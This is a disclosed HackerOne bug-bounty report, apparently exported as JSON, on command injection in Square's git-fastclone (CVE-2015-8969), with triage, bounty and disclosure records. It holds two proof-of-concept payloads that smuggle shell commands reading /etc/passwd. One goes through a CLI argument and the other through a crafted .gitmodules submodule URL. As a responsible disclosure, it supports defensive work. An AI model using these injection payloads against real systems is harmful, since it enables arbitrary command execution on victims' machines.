{"id":105190,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDUxOTA=","url":"https://hackerone.com/reports/105190","title":"Unsafe usage of Ruby string interpolation enabling command injection in git-fastclone","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-12-15T04:47:56.478Z","submitted_at":"2015-12-15T04:47:56.478Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bburky","url":"/bburky","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1644,"url":"https://hackerone.com/square-open-source","handle":"square-open-source","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Square Open Source","twitter_handle":"SquareEng","website":"https://github.com/square","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2015-8969"],"singular_disclosure_disabled":true,"disclosed_at":"2016-01-25T18:40:58.775Z","bug_reporter_agreed_on_going_public_at":"2016-01-19T23:21:00.484Z","team_member_agreed_on_going_public_at":"2016-01-25T18:40:57.974Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"While testing git-fastclone for the ext protocol issues in my other report, I looked at the source code and immediately noticed you're using the [Cocaine][0] library unsafely. Cocaine will protect from command injection but it \"only does that for arguments interpolated via run, NOT arguments passed into new\" (from it's README).\n\nThroughout git-fastclone you call `Cocaine::CommandLine.new` and use plain Ruby string interpolation. This is enables command injection in basically every instance. Instead you need to construct the command line passed to `#new` with `:foo` placeholders and use `#run` to perform the variable substitution. The [security section of the README][1] talks about this a bit.\n\nHere's a very simple exploit POC:\n\n    git fastclone \"'\"'$(cat /etc/passwd \u003e\u00262)'\"'\"\n\nThis first POC may seem less severe because the exploit string is visible to the user. However, in many places command injection is possible using from attacker controlled values within the git repository. Consider the following POC instead which performs command injection into `Cocaine::CommandLine` through a git submodule URL. (Note that this exploit has absolutely nothing at all to do with my previous report concerning the git ext protocol.)\n\n    git init cocaine-command-injection\n    cd cocaine-command-injection\n    \n    # This can be the URL of any valid git repository\n    # This is just used to initially create the submodule in the repo\n    git submodule add https://github.com/octocat/Hello-World malicious-submodule\n    \n    cat \u003e.gitmodules \u003c\u003c\"EOF\"\n    [submodule \"malicious-submodule\"]\n        path = malicious-submodule\n        url = \"'`cat /etc/passwd \u003e\u00262`'\"\n    EOF\n    git add .gitmodules\n    git commit -m 'Malicious Cocaine command injection submodule'\n    cd ..\n    \n    # Now clone the repository\n    git fastclone cocaine-command-injection cocaine-command-injection-clone\n\nPlease instead safely build Cocaine::CommandLine calls by passing placeholders to `#new` and use Cocaine's variable interpolation using the hash passed to `#run`.\n\n[0]: https://github.com/thoughtbot/cocaine\n[1]: https://github.com/thoughtbot/cocaine/blob/master/README.md#security","vulnerability_information_html":"\u003cp\u003eWhile testing git-fastclone for the ext protocol issues in my other report, I looked at the source code and immediately noticed you\u0026#39;re using the \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fthoughtbot%2Fcocaine\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCocaine\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e library unsafely. Cocaine will protect from command injection but it \u0026quot;only does that for arguments interpolated via run, NOT arguments passed into new\u0026quot; (from it\u0026#39;s README).\u003c/p\u003e\n\n\u003cp\u003eThroughout git-fastclone you call \u003ccode\u003eCocaine::CommandLine.new\u003c/code\u003e and use plain Ruby string interpolation. This is enables command injection in basically every instance. Instead you need to construct the command line passed to \u003ccode\u003e#new\u003c/code\u003e with \u003ccode\u003e:foo\u003c/code\u003e placeholders and use \u003ccode\u003e#run\u003c/code\u003e to perform the variable substitution. The \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fthoughtbot%2Fcocaine%2Fblob%2Fmaster%2FREADME.md%23security\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esecurity section of the README\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e talks about this a bit.\u003c/p\u003e\n\n\u003cp\u003eHere\u0026#39;s a very simple exploit POC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egit fastclone \u0026quot;\u0026#39;\u0026quot;\u0026#39;$(cat /etc/passwd \u0026gt;\u0026amp;2)\u0026#39;\u0026quot;\u0026#39;\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis first POC may seem less severe because the exploit string is visible to the user. However, in many places command injection is possible using from attacker controlled values within the git repository. Consider the following POC instead which performs command injection into \u003ccode\u003eCocaine::CommandLine\u003c/code\u003e through a git submodule URL. (Note that this exploit has absolutely nothing at all to do with my previous report concerning the git ext protocol.)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003egit init cocaine-command-injection\ncd cocaine-command-injection\n\n# This can be the URL of any valid git repository\n# This is just used to initially create the submodule in the repo\ngit submodule add https://github.com/octocat/Hello-World malicious-submodule\n\ncat \u0026gt;.gitmodules \u0026lt;\u0026lt;\u0026quot;EOF\u0026quot;\n[submodule \u0026quot;malicious-submodule\u0026quot;]\n    path = malicious-submodule\n    url = \u0026quot;\u0026#39;`cat /etc/passwd \u0026gt;\u0026amp;2`\u0026#39;\u0026quot;\nEOF\ngit add .gitmodules\ngit commit -m \u0026#39;Malicious Cocaine command injection submodule\u0026#39;\ncd ..\n\n# Now clone the repository\ngit fastclone cocaine-command-injection cocaine-command-injection-clone\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease instead safely build Cocaine::CommandLine calls by passing placeholders to \u003ccode\u003e#new\u003c/code\u003e and use Cocaine\u0026#39;s variable interpolation using the hash passed to \u003ccode\u003e#run\u003c/code\u003e.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-02-18T23:21:01.082Z","allow_singular_disclosure_after":-153377580.66384834,"singular_disclosure_allowed":true,"vote_count":2,"voters":["michiel","mak"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":722121,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your submission. We are looking into this further and will get back to you as soon as we have more information.\n","markdown_message":"\u003cp\u003eThank you for your submission. We are looking into this further and will get back to you as soon as we have more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-15T22:10:01.734Z","updated_at":"2015-12-15T22:10:01.734Z","actor":{"username":"skanalyst","cleared":false,"url":"/skanalyst","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":722286,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2015-12-16T01:32:37.124Z","updated_at":"2015-12-16T01:32:37.124Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":722406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@bburky: https://github.com/square/git-fastclone/pull/5, do you want to confirm the fix looks right?","markdown_message":"\u003cp\u003e\u003ca href=\"/bburky\"\u003e@bburky\u003c/a\u003e: \u003ca title=\"https://github.com/square/git-fastclone/pull/5\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fsquare%2Fgit-fastclone%2Fpull%2F5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/square/git-fastclone/pull/5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, do you want to confirm the fix looks right?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-16T04:43:18.353Z","updated_at":"2015-12-16T04:43:18.353Z","actor":{"username":"alokmenghrajani","cleared":false,"url":"/alokmenghrajani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/663/15433a8e00b4c83f236ae346eb728c7c2dc5ce1d_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":722456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, I left some comments.","markdown_message":"\u003cp\u003eThanks, I left some comments.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-16T05:35:21.594Z","updated_at":"2015-12-16T05:35:21.594Z","actor":{"username":"bburky","cleared":false,"url":"/bburky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":755606,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@bburky - Thank you for your interest in Square security. Enjoy the bounty!","markdown_message":"\u003cp\u003e\u003ca href=\"/bburky\"\u003e@bburky\u003c/a\u003e - Thank you for your interest in Square security. Enjoy the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-13T00:57:20.233Z","updated_at":"2016-01-13T00:57:20.233Z","actor":{"url":"/square-open-source","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/644/902e831617282e2da7c1cb7aeecf24117b9004a5_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Square Open Source"}},"bounty_amount":"2000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"square-open-source","collaborator":{"username":"bburky","url":"/bburky"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":755607,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-13T00:57:32.352Z","updated_at":"2016-01-13T00:57:32.352Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bburky","url":"/bburky"},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":764464,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Requesting public disclosure per [rubysec/ruby-advisory-db#232](https://github.com/rubysec/ruby-advisory-db/pull/232).","markdown_message":"\u003cp\u003eRequesting public disclosure per \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frubysec%2Fruby-advisory-db%2Fpull%2F232\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003erubysec/ruby-advisory-db#232\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-19T23:21:00.516Z","updated_at":"2016-01-19T23:21:00.516Z","first_to_agree":true,"actor":{"username":"bburky","cleared":false,"url":"/bburky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/927/7063d426d6fc7bd3390b3a79d9e9c23f53fa3c78_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771274,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-25T18:40:58.078Z","updated_at":"2016-01-25T18:40:58.078Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":771275,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-25T18:40:58.800Z","updated_at":"2016-01-25T18:40:58.800Z","actor":{"username":"fiveinchpixie","cleared":false,"url":"/fiveinchpixie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/638/3ba4c197f8a972b82f8569feaabca9ce4b8a779e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"square-open-source","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}